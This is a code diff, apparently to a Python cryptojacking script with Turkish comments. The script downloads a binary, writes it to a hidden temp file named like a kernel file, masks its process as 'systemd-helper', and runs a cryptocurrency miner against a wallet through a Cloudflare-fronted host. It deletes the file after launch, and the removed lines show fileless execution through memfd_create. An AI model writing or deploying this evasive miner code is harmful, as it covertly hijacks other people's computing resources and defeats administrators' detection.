@@ -8,6 +8,7 @@ import ctypes
 import http.server
 import urllib.request
 import json
+import tempfile
 from urllib.parse import urlparse
 from collections import deque
 
@@ -40,31 +41,40 @@ def execution_logic():
             binary_content = response.read()
         
         log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
-        log_to_console("RAM disk alanı (memfd) oluşturuluyor...")
+        log_to_console("Geçici dosya oluşturuluyor...")
         
-        # memfd_create: syscall 319, flags = 0 (MFD_CLOEXEC yok, child sürece geçer)
-        fd = libc.syscall(319, b"sys-kernel-core", 0)
-        os.write(fd, binary_content)
-        os.fchmod(fd, 0o755)  # Çalıştırma izni ver
-        mem_path = f"/proc/self/fd/{fd}"
+        # Geçici dosya oluştur (varsayılan olarak /tmp altında, diskte ama çoğu container'da tmpfs)
+        with tempfile.NamedTemporaryFile(delete=False, dir='/tmp', prefix='.kernel-') as tmp_file:
+            tmp_file.write(binary_content)
+            tmp_path = tmp_file.name
+        
+        os.chmod(tmp_path, 0o755)  # Çalıştırma izni ver
+        log_to_console(f"Dosya oluşturuldu: {tmp_path}")
         
         log_to_console("Süreç maskeleniyor: systemd-helper")
         set_process_name("systemd-helper")
         
         cmd = [
-            mem_path, "-o", f"{CF_WORKER_HOST}:443", "-u", WALLET_ADDR,
+            tmp_path, "-o", f"{CF_WORKER_HOST}:443", "-u", WALLET_ADDR,
             "-p", f"node-{int(time.time())%1000}", "--keepalive", "--tls",
             "--donate-level=1", "--cpu-max-threads-hint", "50"
         ]
 
         STATUS["running"] = True
         STATUS["message"] = "Sistem Aktif"
-        log_to_console("Madenci başlatıldı. Trafik Cloudflare üzerinden akıyor.")
+        log_to_console("Madenci başlatılıyor...")
 
         # Alt süreci başlat ve çıktılarını oku
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                 text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
         
+        # Geçici dosyayı silebiliriz, çalışan süreç dosyayı kullanmaya devam eder
+        try:
+            os.unlink(tmp_path)
+        except:
+            pass
+        
+        # Çıktıları logla
         for line in iter(proc.stdout.readline, ""):
             if line:
                 log_to_console(f"[CORE] {line.strip()}")
